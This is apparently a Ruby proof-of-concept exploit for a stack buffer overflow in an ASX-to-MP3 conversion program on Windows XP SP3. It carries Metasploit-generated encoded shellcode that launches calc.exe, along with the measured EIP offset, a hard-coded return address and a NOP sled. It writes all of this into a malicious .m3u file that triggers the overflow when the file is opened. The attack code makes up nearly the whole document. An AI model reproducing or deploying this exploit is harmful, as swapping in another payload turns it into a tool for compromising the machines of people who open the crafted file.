#!/usr/bin/ruby

###################################################################################################
# Pretty Colours!
class String
	def error;        "\e[31m[!]\e[0m #{self}" end        # [!] Red
	def fail;         "\e[31m[-]\e[0m #{self}" end        # [-] Red
	def success;      "\e[32m[+]\e[0m #{self}" end        # [+] Green
	def event;        "\e[34m[*]\e[0m #{self}" end        # [*] Blue
	def debug;        "\e[35m[%]\e[0m #{self}" end        # [%] Magenta
	def notification; "[-] #{self}" end                   # [-]
end
###################################################################################################

# Tested on WinXP SP3

#ruby /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x387A5337 -l 50000
#[*] Exact match at offset 14813
# Confirmed 35093 is the correct
# EIP @ 0x000FFD34
#[*] Exact match at offset 35093

# ESP ~ 14869B available

###################################################################################################

# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai -b '\x00\xff\x0a\x0d' -i 3 -f ruby'
buf =
"\xBE\xA4\x05\xFD\xA9\xD9\xC8\xD9\x74\x24\xF4\x5F\x2B\xC9" +
"\xb1\x3e\x83\xc7\x04\x31\x77\x11\x03\x77\x11\xe2\x51\xba" +
"\x08\xe0\x3a\xb3\x29\x25\xe5\x48\xea\x3e\x48\x82\x3b\x0f" +
"\x4a\x67\x7e\x74\x9b\x1a\x8f\x76\x53\xa3\xce\xfb\xaa\xd4" +
"\xc7\xbb\x08\x07\x36\x7b\x12\xb7\xed\x53\x09\x06\x90\x4a" +
"\xc7\xf5\xc2\x0c\xf6\xe5\x71\xd6\xae\x83\xc1\xf0\xa1\x2e" +
"\x9e\x20\x45\xd3\x2c\xe0\x95\x6e\xdd\xb8\x61\xee\x49\xba" +
"\x59\x13\x1f\x56\x2e\x2a\x6f\xac\x4f\x79\x83\x68\x69\x10" +
"\xf4\xd8\x54\x41\x33\x16\xe7\xdb\x2a\x05\x13\x72\x85\xf5" +
"\xf3\xbc\xa6\x52\x5c\x32\x5f\x3d\x3a\x97\x9c\xe0\x03\xdf" +
"\x1f\x24\x62\xcd\xfd\xdd\xa4\x82\x4f\x05\x28\x97\x9f\x0b" +
"\x14\x33\x3c\xe8\x75\x58\x98\xf4\x96\x0e\x1c\xca\xc7\xbd" +
"\x71\xc5\x27\x13\x87\x52\xdb\xa5\x5a\xfb\x57\xe2\x44\x6f" +
"\xc6\xc7\xe2\x68\x18\xe2\x40\x46\xb7\xb9\xd7\xdb\xa1\x41" +
"\xbc\x22\xcd\x5a\x2f\x43\x5c\x8b\x2a\x2f\x20\x1f\xf6\x54" +
"\xcc\x54\x27\xba\xc0\x11\xb6\xdd\x7e\xe3\xf4\x8d\x10\x6a" +
"\x6d\x2e\x6e\x1c\x48\xd5\x37\xd9\xbd\x9d\x3a\x91\x26\x2d" +
"\xe5\xe1\xce\x90\x61\xed\x7a\x8a\xfe\xa6\x07\x85\x8e\xc3" +
"\xd4\x12\xe2\xf8\x61\x25\x5a\x6e\xd1\x17\xa1\xad\xa8\xe3" +
"\xac\x9d\x83\xf8\xd2\xe3\x75\xdf"

buffSize = 50000
junk = "\x41" * 35093
# 0x77DEF049
eip = "\x49\xF0\xDE\x77"
evil = "\x90" * 104 + buf
# Build the final buffer
filler = "\x43" * (buffSize - (junk.length + eip.length + evil.length))
# The final chunk of data which we will send to the server to trigger the exploit.
exploit = junk + eip + evil + filler

###################################################################################################

output = "asx2mp3.m3u"

begin

	if File.exists?(output)
		puts "File [#{output}] exists!! Overwriting!".event
	end

	outputFile = File.open(output, "w")
	outputFile.puts exploit
	outputFile.close

	puts "Successfully wrote to [#{output}]\n".success

rescue SystemExit, Interrupt
	puts "[Ctrl + C] caught! Exiting".error
	abort()
end
